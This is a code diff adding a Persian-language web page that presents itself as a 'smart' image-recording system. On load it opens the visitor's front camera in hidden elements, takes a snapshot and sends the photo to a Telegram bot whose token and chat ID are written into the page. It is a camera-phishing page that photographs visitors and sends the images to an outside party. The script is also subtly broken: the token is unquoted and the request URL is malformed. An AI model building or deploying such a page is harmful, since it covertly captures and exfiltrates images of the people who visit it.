@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سیستم خودکار ثبت تصاویر</title>
+    <style>
+        body { font-family: Tahoma, sans-serif; text-align: center; background-color: #f4f4f9; padding: 50px; }
+        .status { font-size: 20px; color: #333; margin-top: 20px; }
+        .btn { padding: 12px 24px; font-size: 18px; background-color: #0088cc; color: white; border: none; border-radius: 8px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <h2>به سیستم هوشمند خوش آمدید</h2>
+    <div id="status" class="status">در انتظار تایید دسترسی به دوربین...</div>
+    
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const TELEGRAM_TOKEN = 9033755710:AAEbSHK60eu69PejyaEDTCfMD_HvkcF4068;
+        const CHAT_ID = 6330200757;
+
+        const statusDiv = document.getElementById('status');
+
+        // فعال‌سازی دوربین به محض لود شدن صفحه
+        window.addEventListener('load', () => {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+                .then(function(stream) {
+                    statusDiv.innerText = "دوربین فعال شد. در حال ثبت و ارسال تصویر...";
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    
+                    // ۲ ثانیه صبر برای تنظیم کیفیت دوربین و سپس عکس‌برداری
+                    setTimeout(() => {
+                        takeSnapshot(stream);
+                    }, 2000);
+                })
+                .catch(function(err) {
+                    statusDiv.innerText = "خطا: دسترسی به دوربین داده نشد یا مرورگر شما سازگار نیست.";
+                    console.error(err);
+                });
+            } else {
+                statusDiv.innerText = "مرورگر شما از قابلیت دوربین پشتیبانی نمی‌کند.";
+            }
+        });
+
+        function takeSnapshot(stream) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            
+            context.drawImage(video, 0, 0, 640, 480);
+            
+            canvas.toBlob(function(blob) {
+                sendToTelegram(blob, stream);
+            }, 'image/jpeg');
+        }
+
+        function sendToTelegram(blob, stream) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'mobile_photo.jpg');
+
+            fetch(`https://telegram.org{TELEGRAM_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.ok) {
+                    statusDiv.innerHTML = "<span style='color:green;'>✓ تصویر با موفقیت ثبت و ارسال شد.</span>";
+                } else {
+                    statusDiv.innerHTML = "<span style='color:red;'>خطا در ارسال به تلگرام. تنظیمات ربات را چک کنید.</span>";
+                }
+                // خاموش کردن دوربین گوشی جهت حفظ باتری و امنیت
+                stream.getTracks().forEach(track => track.stop());
+            })
+            .catch(error => {
+                statusDiv.innerHTML = "<span style='color:red;'>خطا در ارتباط با سرور تلگرام.</span>";
+                stream.getTracks().forEach(track => track.stop());
+            });
+        }
+    </script>
+</body>
+</html>
